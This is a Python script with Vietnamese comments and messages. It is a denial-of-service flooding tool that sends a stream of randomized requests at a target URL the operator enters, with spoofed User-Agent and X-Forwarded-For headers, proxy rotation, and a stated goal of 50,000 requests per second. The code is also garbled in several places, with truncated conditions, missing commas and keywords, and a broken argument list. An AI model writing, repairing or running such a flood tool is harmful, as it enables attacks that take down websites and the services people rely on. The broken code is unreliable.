import asyncio
import aiohttp
import random
import signal
from fake_useragent import UserAgent
from datetime import datetime

# Biến toàn cục
STOP_FLAG = False
ua = UserAgent(fallback="Mozilla/5.0")

# Hàm xử lý tín hiệu dừng (Ctrl+C)
def signal_handler(sig, frame):
    global STOP_FLAG
    print("\n[!] Đã dừng tấn công theo yêu cầu.")
    STOP_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

# Tạo header giả ngẫu nhiên
def generate_headers():
    headers = {
        "User-Agent": ua.random,
        "Accept": random.choice(["*/*", "text/html", "application/xhtml+xml"]),
        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "gzip, deflate",
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }
    return headers

# Tạo payload giả ngẫu nhiên cho POST
def generate_payload():
    return {"data": "X" * random.randint(100, 1000)}

# Hàm worker gửi request (async)
async def worker(session, sem, url, proxies):
    global STOP_FLAG
    while not STOP_FLAG:
        async with sem:
            try:
                method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
                headers = generate_headers()
                params = {"random": random.randint(1, 1000000)} if method == "GET" else None
                data = generate_payload() if method == "POST" else None
                proxy = random.choice(proxies) if proxies else None

                start_time = datetime.now()
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    params=params                    data=data,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    duration = (datetime.now() - start_time).total_seconds()
                    print(f"[{method}] {response.status} | {duration:.2f}s | {url}")
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                print(f"[!]ỗi: {e}")
            except Exception as e:
                print(f"[!] Lỗi bất thường: {e}")

# Hàm chính
async def main():
    # Nhập URL từ người dùng
    url = input("Nhap URL muc tieu (http://example.com): ").strip()
    if not url("http        url = "http://" + url

    print(f"[+] Bắt đầu tấn công vào {url}")
    print(f"[+] Mục tiêu: 50.000 RPS (mặc định | Tổng: 0 (vô hạn) | Proxy: 0")

    # Tạo connector để tối ưu kết nối
    connector = aiohttp.TCPConnector(limit_per_host=0, ssl=False, force=False)
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=5)

    # Tạo session
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) session:
        # Tạo semaphore để kiểm tốc độ (50k RPS)
        sem = asyncio.Semaphore(5000)  # 50k RPS = 5000 lu đồng thời

        # Tạo các task worker (500 luồng)
        tasks = [worker(session, sem, url, for _ in range(500)]

        # Chạy luồng
 await asyncio.gather(*tasks)

# Chạy ứng dụng
if __name__ == "__main__":
    asyncio.run(main())
